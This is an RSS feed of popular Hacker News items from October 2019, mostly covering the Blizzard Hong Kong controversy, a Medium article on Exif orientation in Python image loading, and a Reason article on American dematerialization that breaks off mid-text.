<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Blizzard has blocked the possibility to remove account</title>
<link>https://twitter.com/Espsilverfire2/status/1182001007976423424</link>
<guid isPermaLink="true" >https://twitter.com/Espsilverfire2/status/1182001007976423424</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://twitter.com/Espsilverfire2/status/1182001007976423424&quot;&gt;https://twitter.com/Espsilverfire2/status/1182001007976423424&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=21208401&quot;&gt;https://news.ycombinator.com/item?id=21208401&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 227&lt;/p&gt;
&lt;p&gt;# Comments: 53&lt;/p&gt;
</description>
<pubDate>Wed, 09 Oct 2019 21:36:49 +0000</pubDate>
<dc:creator>modinfo</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://mobile.twitter.com/Espsilverfire2/status/1182001007976423424</dc:identifier>
</item>
<item>
<title>A dumb reason computer vision apps aren’t working: Exif Orientation</title>
<link>https://medium.com/@ageitgey/the-dumb-reason-your-fancy-computer-vision-app-isnt-working-exif-orientation-73166c7d39da</link>
<guid isPermaLink="true" >https://medium.com/@ageitgey/the-dumb-reason-your-fancy-computer-vision-app-isnt-working-exif-orientation-73166c7d39da</guid>
<description>&lt;div readability=&quot;42.730751708428&quot;&gt;
&lt;div readability=&quot;6.0083333333333&quot;&gt;

&lt;div class=&quot;jh&quot;&gt;
&lt;div class=&quot;ah v&quot;&gt;
&lt;div&gt;&lt;a rel=&quot;noopener&quot; href=&quot;https://medium.com/@ageitgey?source=post_page-----73166c7d39da----------------------&quot;&gt;&lt;img alt=&quot;Adam Geitgey&quot; class=&quot;l ei ji jj&quot; src=&quot;https://miro.medium.com/fit/c/96/96/0*qaGRl18oAZnJiPjb.jpeg&quot; width=&quot;48&quot; height=&quot;48&quot;/&gt;&lt;/a&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p id=&quot;5118&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;I’ve written about lots of computer vision and machine learning projects like &lt;a class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; href=&quot;https://medium.com/@ageitgey/snagging-parking-spaces-with-mask-r-cnn-and-python-955f2231c400&quot;&gt;object recognition systems&lt;/a&gt; and &lt;a class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; href=&quot;https://medium.com/@ageitgey/build-a-hardware-based-face-recognition-system-for-150-with-the-nvidia-jetson-nano-and-python-a25cb8c891fd&quot;&gt;face recognition projects&lt;/a&gt;. I also have an open source Python &lt;a href=&quot;https://github.com/ageitgey/face_recognition&quot; class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;face recognition library&lt;/a&gt; that is somehow one of the &lt;a href=&quot;https://github.blog/2019-01-24-the-state-of-the-octoverse-machine-learning/&quot; class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;top 10 most popular machine learning libraries on Github&lt;/a&gt;. Together, that means that I get asked a &lt;em class=&quot;ko&quot;&gt;lot&lt;/em&gt; of questions from people new to Python and computer vision.&lt;/p&gt;

&lt;p id=&quot;6d8f&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;In my experience, there is one technical problem that trips people up more often than any other. No, it’s not a complicated theoretical issue or an issue with expensive GPUs. It’s the fact that almost everyone is loading their images into memory sideways without even knowing it. And computers are &lt;em class=&quot;ko&quot;&gt;less than excellent&lt;/em&gt; at detecting objects or identifying faces in sideways images.&lt;/p&gt;
&lt;h2 id=&quot;31fb&quot; class=&quot;lh li fe bh bg fw lj lk ll lm ln lo lp lq lr ls lt&quot;&gt;How Digital Cameras Auto-Rotate Images&lt;/h2&gt;
&lt;p id=&quot;d040&quot; class=&quot;jw jx fe bh jy b jz lu kb lv kd lw kf lx kh ly kj&quot;&gt;When you take a picture, the camera will sense which end you have tilted up. This is so the picture will appear in the correct orientation when you look at it again in another program:&lt;/p&gt;

&lt;p id=&quot;c0c9&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;But the tricky part is that your camera doesn’t actually rotate the image data inside the file that it saves to disk. Because image sensors inside digital cameras are read line-by-line as a continuous stream of pixel information, it’s easier for a camera to always save the pixel data in the same order no matter which way the camera was held.&lt;/p&gt;

&lt;p id=&quot;8554&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;It’s actually up to the image viewer application to rotate the image correctly before displaying it. Along with the image data, your camera also saves metadata about each picture — lens settings, location data, and of course, the camera’s rotation angle. The image viewer is supposed to use this information to display the image correctly.&lt;/p&gt;
&lt;p id=&quot;abed&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;The most common format for image metadata is called &lt;strong class=&quot;jy mb&quot;&gt;Exif&lt;/strong&gt; (short for &lt;em class=&quot;ko&quot;&gt;Exchangeable image file format&lt;/em&gt;). The Exif-formatted metadata is shoved inside the jpeg file that your camera saves. You can’t see Exif data as part of the image itself, but it is readable by any program that knows where to look for it.&lt;/p&gt;
&lt;p id=&quot;1871&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;Here’s the Exif metadata inside our Goose jpeg image as displayed by &lt;code class=&quot;lc mc md me mf b&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/ExifTool&quot; class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;exiftool&lt;/a&gt;&lt;/code&gt;:&lt;/p&gt;
&lt;/div&gt;&lt;div readability=&quot;88.255287009063&quot;&gt;
&lt;p id=&quot;102b&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;Notice the ‘Orientation’ data element. This tells the image viewer program that the image needs to be rotated 90 degrees counter-clockwise before being displayed on screen. If the program forgets to do this, the image will be sideways!&lt;/p&gt;

&lt;h2 id=&quot;5328&quot; class=&quot;lh li fe bh bg fw lj lk ll lm ln lo lp lq lr ls lt&quot;&gt;Why does this break so many Python Computer Vision Applications?&lt;/h2&gt;
&lt;p id=&quot;c8a4&quot; class=&quot;jw jx fe bh jy b jz lu kb lv kd lw kf lx kh ly kj&quot;&gt;Exif metadata is not a native part of the Jpeg file format. It was an afterthought taken from the TIFF file format and tacked onto the Jpeg file format much later. This maintained backwards compatibility with old image viewers, but it meant that some programs never bothered to parse Exif data.&lt;/p&gt;
&lt;p id=&quot;00b0&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;Most Python libraries for working with image data like numpy, scipy, TensorFlow, Keras, etc, think of themselves as &lt;em class=&quot;ko&quot;&gt;scientific tools for serious people&lt;/em&gt; who work with generic arrays of data. They don’t concern themselves with &lt;em class=&quot;ko&quot;&gt;consumer-level problems&lt;/em&gt; like automatic image rotation — even though basically every image in the world captured with a modern camera needs it.&lt;/p&gt;
&lt;p id=&quot;df77&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;This means that when you load an image with almost any Python library, you get the original, unrotated image data. And guess what happens when you try to feed a sideways or upside-down image into a face detection or object detection model? The detector fails because you gave it bad data.&lt;/p&gt;
&lt;p id=&quot;5f9f&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;You might think this problem is limited to Python scripts written by beginners and students, but that’s not the case! Even &lt;a href=&quot;https://cloud.google.com/vision/docs/drag-and-drop&quot; class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Google’s flagship Vision API demo&lt;/a&gt; doesn’t handle Exif orientation correctly:&lt;/p&gt;

Google Vision’s API demo fails to rotate a portrait-oriented image captured with a standard cell phone.
&lt;p id=&quot;8cab&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;And while Google Vision still manages to detect some of the animals in the sideways image, it detects them with a non-specific “Animal” label. This is because it is a lot harder for a model to detect a sideways goose than an upright goose. Here’s what Google Vision detects if the image is correctly rotated before being fed into the model:&lt;/p&gt;

&lt;p id=&quot;f706&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;With the correct image orientation, Google detects the birds with the more specific “Goose” label and a higher confidence score. Much better!&lt;/p&gt;
&lt;p id=&quot;13be&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;This is a super obvious problem if you &lt;em class=&quot;ko&quot;&gt;can see that the image is sideways&lt;/em&gt; like in this demo. But this is where things get insidious —normally you can’t see it! Every normal program on your computer will only display the image in its properly rotated form instead of how it is actually stored sideways on disk. So when you try to view the image to see why your model isn’t working, it will be displayed the right way and you won’t know why your model isn’t working!&lt;/p&gt;

Finder on a Mac always displays images with Exif rotation applied. There is no way to see that the image data is actually sideways inside the file.
&lt;p id=&quot;55dd&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;This inevitably leads to people posting issues on Github complaining that the open source projects that they are using are broken or the models aren’t very accurate. But the problem is so much simpler — they are feeding in sideways and/or upside-down images!&lt;/p&gt;
&lt;h2 id=&quot;e1c1&quot; class=&quot;lh li fe bh bg fw lj lk ll lm ln lo lp lq lr ls lt&quot;&gt;Fixing the Problem&lt;/h2&gt;
&lt;p id=&quot;e45a&quot; class=&quot;jw jx fe bh jy b jz lu kb lv kd lw kf lx kh ly kj&quot;&gt;The solution is that whenever you load images in your Python programs, you should check them for Exif Orientation metadata and rotate the images if needed. It’s pretty simple to do, but surprisingly hard to find examples of code online that does it correctly for all orientations.&lt;/p&gt;
&lt;p id=&quot;8c35&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;Here is code to load any image into a numpy array with the correct rotation applied:&lt;/p&gt;

&lt;p id=&quot;c069&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;From there, you can pass the array of image data to any standard Python ML library that expects arrays of image data, like Keras or TensorFlow.&lt;/p&gt;
&lt;p id=&quot;13ff&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;Since this comes up so often, I published this function as a library on pip called &lt;a href=&quot;https://github.com/ageitgey/image_to_numpy&quot; class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;image_to_numpy&lt;/a&gt;. You can install it like this:&lt;/p&gt;
&lt;pre class=&quot;kq kr ks kt ku gt eb ne&quot;&gt;
&lt;span id=&quot;e93e&quot; class=&quot;lh li fe bh mf b dm nf ng l nh&quot;&gt;pip3 install image_to_numpy&lt;/span&gt;
&lt;/pre&gt;
&lt;p id=&quot;e489&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;You can use it in any Python program to load an image correctly, like this:&lt;/p&gt;
&lt;pre class=&quot;kq kr ks kt ku gt eb ne&quot;&gt;
&lt;span id=&quot;8257&quot; class=&quot;lh li fe bh mf b dm nf ng l nh&quot;&gt;import matplotlib.pyplot as plt&lt;br/&gt;import image_to_numpy&lt;/span&gt;&lt;span id=&quot;e084&quot; class=&quot;lh li fe bh mf b dm ni nj nk nl nm ng l nh&quot;&gt;# Load your image file&lt;br/&gt;img = image_to_numpy.load_image_file(&quot;my_file.jpg&quot;)&lt;/span&gt;&lt;span id=&quot;f58b&quot; class=&quot;lh li fe bh mf b dm ni nj nk nl nm ng l nh&quot;&gt;# Show it on the screen (or whatever you want to do)&lt;br/&gt;plt.imshow(img)&lt;br/&gt;plt.show()&lt;/span&gt;
&lt;/pre&gt;
&lt;p id=&quot;f1d5&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;Check out the &lt;a href=&quot;https://github.com/ageitgey/image_to_numpy#image_to_numpy&quot; class=&quot;aq cd kk kl km kn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;readme file for more details&lt;/a&gt;.&lt;/p&gt;
&lt;p id=&quot;1945&quot; class=&quot;jw jx fe bh jy b jz ka kb kc kd ke kf kg kh ki kj&quot;&gt;Have fun!&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Wed, 09 Oct 2019 20:08:05 +0000</pubDate>
<dc:creator>ageitgey</dc:creator>
<og:type>article</og:type>
<og:title>The dumb reason your fancy Computer Vision app isn’t working: Exif Orientation</og:title>
<og:description>I’ve written about lots of computer vision and machine learning projects like object recognition systems and face recognition projects. I…</og:description>
<og:url>https://medium.com/@ageitgey/the-dumb-reason-your-fancy-computer-vision-app-isnt-working-exif-orientation-73166c7d39da</og:url>
<og:image>https://miro.medium.com/max/1200/1*pL35ryyxT16MKFZWUMtkbQ.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://medium.com/@ageitgey/the-dumb-reason-your-fancy-computer-vision-app-isnt-working-exif-orientation-73166c7d39da</dc:identifier>
</item>
<item>
<title>Blizzard Employees Staged a Walkout to Protest Banned Pro-Hong Kong Gamer</title>
<link>https://www.thedailybeast.com/blizzard-employees-staged-a-walkout-to-protest-banned-pro-hong-kong-gamer</link>
<guid isPermaLink="true" >https://www.thedailybeast.com/blizzard-employees-staged-a-walkout-to-protest-banned-pro-hong-kong-gamer</guid>
<description>&lt;p&gt;A small group of Activision Blizzard employees walked out of work Tuesday afternoon to protest the company’s actions against a gamer who expressed support for pro-democracy protesters in Hong Kong during an official livestream.&lt;/p&gt;
&lt;p&gt;The game publisher behind online multiplayer hits like World of Warcraft and Overwatch &lt;a class=&quot;LinkWrapper LinkWrapper--external&quot; href=&quot;https://www.nytimes.com/2019/10/09/world/asia/blizzard-hearthstone-hong-kong.html&quot;&gt;banned&lt;/a&gt; Hong Kong-based professional Hearthstone player Chung Ng Wai from thegame’s lucrative pro league for a year on Tuesday. Chung, who uses the handle “Blitzchung,” prompted the ban after saying “Liberate Hong Kong, revolution of our times” during an interview about his tournament wins. Blizzard’s actions forced him to forfeit $10,000 in prize money he had already won.&lt;/p&gt;
&lt;p&gt;“The action Blizzard took against the player was pretty appalling but not surprising,” a longtime Blizzard employee told The Daily Beast. “Blizzard makes a lot of money in China, but now the company is in this awkward position where we can’t abide by our values.”&lt;/p&gt;
&lt;p&gt;“I’m disappointed,” another current Blizzard employee said. “We want people all over the world to play our games, but no action like this can be made with political neutrality.” The employees spoke on condition of anonymity for fear of professional consequences.&lt;/p&gt;
&lt;p&gt;Protesting Blizzard employees from multiple departments gathered at an iconic &lt;a class=&quot;LinkWrapper LinkWrapper--external&quot; href=&quot;https://news.blizzard.com/en-us/blizzard/21349313/the-orc-statue&quot;&gt;statue of an Orc warrior&lt;/a&gt; charging into battle in the center of the company’s main campus in Irvine, California, starting around 10 a.m. Pacific Time. The demonstration’s numbers fluctuated throughout the day, the two employees said, ranging from a dozen to 30, and the protesters departed sometime in the late afternoon. The protesters would have been visible to executive offices, which overlook the main plaza, the two employees said. The company did not immediately respond to a request for comment.&lt;/p&gt;
&lt;p&gt;The Chinese tech giant Tencent owns a 5 percent stake in Blizzard, and the gaming company earned 12 percent of its revenue from the Asia-Pacific region last quarter, according to its &lt;a class=&quot;LinkWrapper LinkWrapper--external&quot; href=&quot;https://investor.activision.com/news-releases/news-release-details/activision-blizzard-announces-second-quarter-2019-financial&quot;&gt;earnings reports&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The decision prompted backlash from gamers and non-gamers alike, adding fuel to the fire begun by the National Basketball Association’s own &lt;a class=&quot;TrackingLink LinkWrapper&quot; href=&quot;https://www.thedailybeast.com/nba-chinese-organizers-shut-down-fan-event-over-free-speech-row&quot;&gt;controversy&lt;/a&gt; over China and the Hong Kong protests.&lt;/p&gt;
&lt;p&gt;A person claiming to be a Blizzard employee and using the handle “Standingwhk” posted a &lt;a class=&quot;LinkWrapper LinkWrapper--external&quot; href=&quot;https://www.reddit.com/r/hearthstone/comments/df52sw/blizzard_employees_standing_with_hk/&quot;&gt;picture&lt;/a&gt; to Reddit and Imgur that showed roughly 20 employees involved in the demonstration. Several employees held umbrellas, a visual symbol adopted by protesters in Hong Kong. Two current Blizzard employees authenticated the photo to The Daily Beast. &lt;/p&gt;
&lt;p&gt;Blizzard has placed plaques with its core company values along a circular compass around the orc. According to the two employees and &lt;a class=&quot;LinkWrapper LinkWrapper--external&quot; href=&quot;https://twitter.com/lackofrealism/status/1181639970332659712?s=20&quot;&gt;photos&lt;/a&gt;, protesters had papered over one that read, “Every voice matters.”&lt;/p&gt;
&lt;p&gt;The protesters also solicited signatures for a petition expressing displeasure with Blizzard leadership’s handling of the matter that they planned to submit to executives, the two employees said. Discussion about Blizzard’s actions and of the protest, they said, continued Wednesday. The two employees said Blizzard executives have not taken any public action against the protesters. &lt;/p&gt;
&lt;p&gt;Blizzard’s actions inspired a negative reaction among lawmakers, who denounced the gaming giant. On Twitter, Sen. Ron Wyden (D-OR) said the company was willing to “&lt;a class=&quot;LinkWrapper LinkWrapper--external&quot; href=&quot;https://twitter.com/RonWyden/status/1181637167749193729&quot;&gt;humiliate itself&lt;/a&gt;” to please China. And Sen. Marco Rubio (R-FL) declared, “Implications of this will be felt long after everyone in U.S. politics today is gone.”&lt;/p&gt;

&lt;p&gt;One of the employees who spoke to The Daily Beast felt that the protest signaled a new era for Blizzard. The company has been complying with government censorship requests within its games in order to keep doing business in one of its biggest markets, he said.&lt;/p&gt;
&lt;p&gt;“Doing business in China, it’s been easier to ignore the authoritarianism of the government because they were asking us to do things like remove a skeleton [from a game],” he said. &lt;/p&gt;
&lt;p&gt;“The stakes are so much higher now. What was previously an obvious decision is much less obvious now.”&lt;/p&gt;
</description>
<pubDate>Wed, 09 Oct 2019 19:35:46 +0000</pubDate>
<dc:creator>minimaxir</dc:creator>
<og:title>Blizzard Employees Staged a Walkout After the Company Banned a Gamer for Pro-Hong Kong Views</og:title>
<og:description>“Blizzard makes a lot of money in China, but now the company is in this awkward position where we can’t abide by our values,” a Blizzard employee told The Daily Beast.</og:description>
<og:url>https://www.thedailybeast.com/blizzard-employees-staged-a-walkout-to-protest-banned-pro-hong-kong-gamer</og:url>
<og:image>https://img.thedailybeast.com/image/upload/c_crop,d_placeholder_euli9k,h_1687,w_3000,x_0,y_0/dpr_2.0/c_limit,w_740/fl_lossy,q_auto/v1570646633/191009-activision-blizzard-tease_vhafvv</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.thedailybeast.com/blizzard-employees-staged-a-walkout-to-protest-banned-pro-hong-kong-gamer</dc:identifier>
</item>
<item>
<title>Blizzard&amp;#039;s Weibo Account Just Posted an Apology To China</title>
<link>https://reddit.com/r/HongKong/comments/dfkmp1/blizzards_official_weibo_account_just_posted_an/</link>
<guid isPermaLink="true" >https://reddit.com/r/HongKong/comments/dfkmp1/blizzards_official_weibo_account_just_posted_an/</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://reddit.com/r/HongKong/comments/dfkmp1/blizzards_official_weibo_account_just_posted_an/&quot;&gt;https://reddit.com/r/HongKong/comments/dfkmp1/blizzards_official_weibo_account_just_posted_an/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=21205990&quot;&gt;https://news.ycombinator.com/item?id=21205990&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 345&lt;/p&gt;
&lt;p&gt;# Comments: 79&lt;/p&gt;
</description>
<pubDate>Wed, 09 Oct 2019 18:02:19 +0000</pubDate>
<dc:creator>fasthandle</dc:creator>
<og:title>r/HongKong - Blizzard's Official Weibo Account Just Posted An Apology - to China</og:title>
<og:type>website</og:type>
<og:url>https://www.reddit.com/r/HongKong/comments/dfkmp1/blizzards_official_weibo_account_just_posted_an/</og:url>
<og:description>395 votes and 39 comments so far on Reddit</og:description>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.reddit.com/r/HongKong/comments/dfkmp1/blizzards_official_weibo_account_just_posted_an/</dc:identifier>
</item>
<item>
<title>Epic CEO says it won&amp;#039;t ban Fortnite players for taking a stance on human rights</title>
<link>https://twitter.com/TimSweeneyEpic/status/1181946357759844352</link>
<guid isPermaLink="true" >https://twitter.com/TimSweeneyEpic/status/1181946357759844352</guid>
<description>&lt;p&gt;Honestly, I don't like the Epic Store or it's approach to exclusivity Tim. 

But, I love gaming (UT Always) none the less and as a veteran, seeing you stand up for American values and our freedoms I applaud you and wish you the best. You've gained a customer.&lt;/p&gt;
</description>
<pubDate>Wed, 09 Oct 2019 16:54:18 +0000</pubDate>
<dc:creator>Aissen</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://mobile.twitter.com/TimSweeneyEpic/status/1181946357759844352</dc:identifier>
</item>
<item>
<title>Americans Are Using Less Steel, Paper, Fertilizer, and Energy</title>
<link>https://reason.com/2019/10/09/the-economy-keeps-growing-but-americans-are-using-less-steel-paper-fertilizer-and-energy/</link>
<guid isPermaLink="true" >https://reason.com/2019/10/09/the-economy-keeps-growing-but-americans-are-using-less-steel-paper-fertilizer-and-energy/</guid>
<description>&lt;p&gt;&lt;span&gt;Environmental scientist Jesse Ausubel remembers the moment his research trajectory changed. Over dinner one night in 1987, his friend and colleague Robert Herman, a physicist with a wide range of interests, wondered aloud, &quot;Are buildings getting lighter?&quot; That apparently simple question inspired the pair to begin looking into the &quot;material intensity&quot; of the modern world.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;In 2015, Ausubel published an essay titled &quot;The Return of Nature: How Technology Liberates the Environment.&quot; He had found substantial evidence not only that Americans were consuming fewer resources per capita but also that they were consuming less in total of some of the most important building blocks of an economy: things such as steel, copper, fertilizer, timber, and paper. Total annual U.S. consumption of all of these had been increasing rapidly prior to 1970. But since then, consumption had reached a peak and then declined.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;This was unexpected, to put it mildly. &quot;The reversal in use of some of the materials so surprised me that [a few colleagues] and I undertook a detailed study of the use of 100 commodities in the United States from 1900 to 2010,&quot; Ausubel wrote. &quot;We found that 36 have peaked in absolute use…Another 53 commodities have peaked relative to the size of the economy, though not yet absolutely. Most of them now seem poised to fall.&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A few years earlier, a writer and researcher named Chris Goodall had noticed something similar in the United Kingdom's Material Flow Accounts, &quot;a set of dry and largely ignored data published annually by the Office for National Statistics,&quot; as the&lt;/span&gt; &lt;em&gt;&lt;span&gt;Guardian&lt;/span&gt;&lt;/em&gt; &lt;span&gt;put it. He summarized his findings in a 2011 paper titled &quot;'Peak Stuff ': Did the UK Reach a Maximum Use of Material Resources in the Early Part of the Last Decade?&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Goodall's answer to his own question was, essentially, yes: &quot;Evidence presented in this paper supports a hypothesis that the United Kingdom began to reduce its consumption of physical resources in the early years of the last decade, well before the economic slowdown that started in 2008. This conclusion applies to a wide variety of different physical goods, for example water, building materials and paper and includes the impact of items imported from overseas. Both the weight of goods entering the economy and the amounts finally ending up as waste probably began to fall from sometime between 2001 and 2003.&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Goodall was eloquent about the significance of dematerialization: &quot;If correct, this finding is important. It suggests that economic growth in a mature economy does not necessarily increase the pressure on the world's reserves of natural resources and on its physical environment. An advanced country may be able to decouple economic growth and increasing volumes of material goods consumed. A sustainable economy does not necessarily have to be a no-growth economy.&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;I agreed with Goodall about the significance of economy-wide dematerialization, especially because the United Kingdom and the United States were the leading economies of the Industrial Era—a period that was defined by an unprecedented and extraordinary rise in the use of natural resources and other exploitations of the environment. If those two countries could reverse course and achieve substantial dematerialization, it would be a fascinating and hopeful development.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;It would also be surprising, because it would mean that something fundamental about the mainstream understanding of how growth works would be incorrect. Most of us carry around an implicit or explicit belief that because humans always want to consume more, we will use more resources year after year to satisfy these wants. Technologies that allow us to make more efficient use of resources will not let us conserve resources, because we'll just use the technologies to let us consume even more—so much more that overall resource use will continue to rise. &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;This was the clear pattern until 1970. What could possibly have caused it to change? Moreover, if absolute dematerialization was a real and durable phenomenon, were there any interventions that individuals, communities, and governments could make that would help accelerate and spread it?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Great Reversal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Fortunately for anyone interested in dematerialization, a lot of high-quality evidence exists about resource consumption over time in America. Much of it comes from the U.S. Geological Survey (USGS), a federal agency formed in 1879 and tasked by Congress with &quot;classification of the public lands, and examination of the geological structure, mineral resources, and products of the national domain.&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;That examination of mineral resources is a boon to anyone interested in dematerialization, because since the start of the 20th century, the USGS has been collecting data on the use of the most economically important minerals in America. Of particular interest is the survey's yearly estimate of &quot;apparent consumption&quot; of each mineral.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;This consumption takes into account not only domestic production of the resource but also imports and exports. For example, to calculate America's total apparent consumption of copper in 2015, the USGS would take the amount of copper produced in the country that year, add total imports of copper, and subtract total copper exports.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The survey's data tell a fascinating story. To understand it, let's start with metals, one of the most obviously important materials for any economy. Here's total annual consumption from 1900 to 2015 of the five most important metals in the United States. A reminder: This is not annual consumption per American. This is annual consumption by all Americans—the total tonnage used year by year of these metals.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img class=&quot;wp-image-8026818 size-large&quot; src=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/metals-1024x744.png&quot; alt=&quot;U.S. GDP and Consumption of Metals, 1900–2015&quot; width=&quot;1024&quot; height=&quot;744&quot; data-credit=&quot;U.S. GDP and Consumption of Metals, 1900–2015&quot; srcset=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/metals-1024x744.png 1024w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/metals-300x218.png 300w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/metals-768x558.png 768w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/metals.png 1422w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/p&gt;
U.S. GDP and Consumption of Metals, 1900–2015
&lt;p&gt;&lt;span&gt;All of these metals are &quot;post-peak&quot; in America, meaning that the country hit its maximum consumption of each of them some years ago and has seen generally declining in use since then. The magnitude of the dematerialization is large. In 2015 (the most recent year for which USGS data are available), total American use of steel was down more than 15 percent from its high point in 2000. Aluminum consumption was down more than 32 percent and copper 40 percent from their peaks.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;This dematerialization becomes even more impressive when consumption of resources in the United States is compared to the country's economic growth. Note that a huge decoupling has taken place. Up to 1970, consumption of metals in America grew just about in lockstep with the overall economy. In the years since 1970, the economy has continued to grow pretty steadily, but consumption of metals has reversed course and is now decreasing. We're now getting more &quot;economy&quot; from less metal year after year. We'll see a similar great reversal in the use of many other resources.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;America is an agricultural powerhouse—the world's largest producer of both soybeans and corn and fourth-largest producer of wheat. Fertilizer is, as we've seen, essential for growing crops. So here's the country's total consumption over time of fertilizer, water, and cropland. Instead of GDP, this graph charts total U.S. crop tonnage.&lt;/span&gt;&lt;/p&gt;

